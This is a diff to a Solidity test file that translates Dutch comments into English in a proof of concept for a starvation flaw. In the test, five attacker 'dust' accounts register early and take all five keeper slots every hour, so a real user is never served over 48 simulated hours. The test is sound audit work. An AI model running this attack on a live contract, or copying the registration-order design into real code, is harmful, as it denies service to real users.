@@ -8,7 +8,7 @@ import {MockAggregator} from "./mocks/MockAggregator.sol";
 import {MockRouter} from "./mocks/MockRouter.sol";
 import {MockUniswapV3Pool} from "./mocks/MockUniswapV3Pool.sol";
 
-/// PoC: 5 stof-owners die vóór de echte gebruiker registreren, bezetten elk uur alle 5 CRE-slots.
+/// PoC: 5 dust owners that register before the real user occupy all 5 CRE slots every hour.
 contract PocStarvation is Test {
     uint256 constant START = 1_800_000_000;
     uint256 constant PRICE = 80_000e6;
@@ -57,7 +57,7 @@ contract PocStarvation is Test {
         return Rebalancer.Params({active: true, targetBps: 8000, bandBps: 500, maxCorrectionBps: 1000, minTradeEurc: 5e6, interval: 1 hours, maxSlippageBps: 100});
     }
 
-    /// Nabootsing van cre/bitburo-keeper/main.ts: eerste 5 due owners in registratievolgorde.
+    /// Imitation of cre/bitburo-keeper/main.ts: first 5 due owners in registration order.
     function _creReport() internal view returns (address[] memory list) {
         uint256 count = r.ownerCount();
         address[] memory tmp = new address[](5);
@@ -71,7 +71,7 @@ contract PocStarvation is Test {
     }
 
     function test_poc_dustOwnersStarveRealUserForever() public {
-        // Aanvaller: 5 adressen, elk 1 EURC (1e6), stof-params. Kosten: 5x setParams + 5x approve.
+        // Attacker: 5 addresses, each 1 EURC (1e6), dust params. Cost: 5x setParams + 5x approve.
         address[5] memory dust;
         for (uint256 i = 0; i < 5; i++) {
             dust[i] = makeAddr(string(abi.encodePacked("dust", i)));
@@ -81,7 +81,7 @@ contract PocStarvation is Test {
             r.setParams(_dustParams());
             vm.stopPrank();
         }
-        // Echte gebruiker registreert daarna met 1.000 EURC en is elk uur due (cap 10%).
+        // Real user registers afterwards with 1,000 EURC and is due every hour (cap 10%).
         eurc.mint(alice, 1000e6);
         vm.startPrank(alice);
         eurc.approve(address(r), type(uint256).max);
@@ -91,13 +91,13 @@ contract PocStarvation is Test {
 
         (bool due, int256 delta) = r.isDue(dust[0]);
         assertTrue(due);
-        console.log("stof-owner due, correctie in EURC-basiseenheden:", uint256(delta)); // 100 = 0,0001 EURC
+        console.log("dust owner due, correction in EURC base units:", uint256(delta)); // 100 = 0.0001 EURC
 
         uint256 aliceServed;
         for (uint256 hour = 0; hour < 48; hour++) {
             address[] memory list = _creReport();
-            if (hour < 3 || hour == 47) console.log("uur", hour, "now", vm.getBlockTimestamp());
-            if (hour < 3 || hour == 47) console.log("  due in rapport:", list.length, "dust0 last", r.lastExecutedAt(dust[0]));
+            if (hour < 3 || hour == 47) console.log("hour", hour, "now", vm.getBlockTimestamp());
+            if (hour < 3 || hour == 47) console.log("  due in report:", list.length, "dust0 last", r.lastExecutedAt(dust[0]));
             if (list.length != 5) {
                 (bool d0, int256 dl) = r.isDue(dust[0]);
                 console.log("dust0 due", d0, "delta", uint256(dl));
@@ -106,17 +106,17 @@ contract PocStarvation is Test {
                 (bool ok, uint256 q) = (true, r.quoteChecked()); console.log("quote", q, ok);
             }
             assertEq(list.length, 5);
-            for (uint256 i = 0; i < 5; i++) assertEq(list[i], dust[i], "slot bezet door stof-owner");
+            for (uint256 i = 0; i < 5; i++) assertEq(list[i], dust[i], "slot occupied by dust owner");
             vm.prank(forwarder);
             r.onReport{gas: 4_000_000}(abi.encodePacked(bytes32(uint256(1)), bytes10("bitburo"), wfOwner, bytes2(0x0001)), abi.encode(list));
             if (r.lastExecutedAt(alice) != 0) aliceServed++;
             vm.warp(vm.getBlockTimestamp() + 1 hours);
             _price();
         }
-        assertEq(aliceServed, 0, "alice is in 48 uur nooit door de CRE-wekker bediend");
+        assertEq(aliceServed, 0, "alice is never served by the CRE keeper in 48 hours");
         (due,) = r.isDue(alice);
         assertTrue(due);
-        console.log("stof-owner saldo na 48 runs:", eurc.balanceOf(dust[0]), "(van 1.000.000)");
-        console.log("treasury-fee na 240 stof-runs:", eurc.balanceOf(treasury));
+        console.log("dust owner balance after 48 runs:", eurc.balanceOf(dust[0]), "(of 1,000,000)");
+        console.log("treasury fee after 240 dust runs:", eurc.balanceOf(treasury));
     }
 }
